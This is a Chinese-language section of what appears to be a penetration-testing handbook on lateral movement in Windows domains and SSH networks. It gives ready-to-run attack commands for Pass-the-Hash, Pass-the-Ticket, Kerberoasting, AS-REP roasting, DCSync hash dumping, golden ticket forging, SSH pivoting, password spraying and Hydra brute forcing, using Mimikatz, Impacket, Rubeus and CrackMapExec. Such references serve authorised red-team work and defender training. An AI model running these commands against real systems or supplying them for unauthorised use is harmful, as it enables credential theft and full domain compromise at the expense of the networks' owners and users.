# 横向移动技术

### 4.1 Windows 横向移动

#### 4.1.1 Pass the Hash

**PtH 原理**
- 使用 NTLM Hash 替代明文密码进行认证
- 适用于 NTLM 认证的所有协议（SMB/WMI/HTTP/MSSQL）

**工具使用**
```bash
# CrackMapExec / NetExec
crackmapexec smb 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH

# Impacket
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH domain/user@10.0.0.10
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH domain/user@10.0.0.10

# Evil-WinRM
evil-winrm -i 10.0.0.10 -u administrator -H NTLM_HASH

# Mimikatz
mimikatz # sekurlsa::pth /user:administrator /domain:domain.com /ntlm:NTLM_HASH /run:cmd.exe
```

#### 4.1.2 Pass the Ticket

**PtT 原理**
- 使用 Kerberos 票据（TGT/TGS）进行认证
- 票据存储在内存中（LSASS）
- 无需密码或 Hash

**工具使用**
```bash
# Rubeus
Rubeus.exe ptt /ticket:base64_ticket
Rubeus.exe asktgt /user:username /rc4:NTLM_HASH /ptt

# Mimikatz
mimikatz # kerberos::ptt ticket.kirbi

# Impacket
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.com/user@10.0.0.10
```

#### 4.1.3 Kerberoasting

**原理**
- 请求服务票据（TGS）
- 票据用服务账户的密码 Hash 加密
- 离线破解获取服务账户明文密码

**操作流程**
```bash
# 使用 Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# 使用 Impacket
impacket-GetUserSPNs domain.com/user:password -request -outputfile hashes.txt

# 使用 PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding UTF8 hashes.txt

# 破解
hashcat -m 13100 hashes.txt wordlist.txt
john --format=krb5tgs hashes.txt
```

#### 4.1.4 AS-REP Roasting

**原理**
- 针对设置了"不需要 Kerberos 预认证"的用户
- 可以直接获取 AS-REP 响应
- 离线破解获取用户明文密码

**操作流程**
```bash
# 使用 Rubeus
Rubeus.exe asreproast /outfile:hashes.txt

# 使用 Impacket
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -format hashcat -outputfile hashes.txt

# 破解
hashcat -m 18200 hashes.txt wordlist.txt
```

#### 4.1.5 DCSync

**原理**
- 模拟域控制器的复制行为
- 通过 DRSUAPI 接口获取域内所有用户的 Hash
- 需要 DCsync 权限（Domain Admins / DC 本身 / 特定权限）

**操作流程**
```bash
# Mimikatz
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.com /all /csv

# Impacket
impacket-secretsdump domain.com/user:password@DC_IP -just-dc
```

#### 4.1.6 黄金票据

**原理**
- 获取 krbtgt 账户 Hash 后
- 可以伪造任意用户的 TGT
- 票据有效期默认 10 年
- 即使重置用户密码仍然有效

**操作流程**
```bash
# Mimikatz 生成黄金票据
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# Impacket 生成票据
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.com Administrator
```

### 4.2 非域环境横向移动

#### 4.2.1 SSH 横向移动

```bash
# SSH 密钥利用
ssh -i id_rsa user@10.0.0.10

# SSH 代理转发利用
ssh -A user@10.0.0.10  # 代理转发
# 然后可以从跳板机 SSH 到其他机器

# SSH 动态端口转发
ssh -D 1080 user@10.0.0.10  # SOCKS 代理
```

#### 4.2.2 密码复用

```bash
# CrackMapExec 密码喷洒
crackmapexec ssh 10.0.0.0/24 -u users.txt -p password123

# Hydra SSH 爆破
hydra -L users.txt -P passwords.txt ssh://10.0.0.10
```
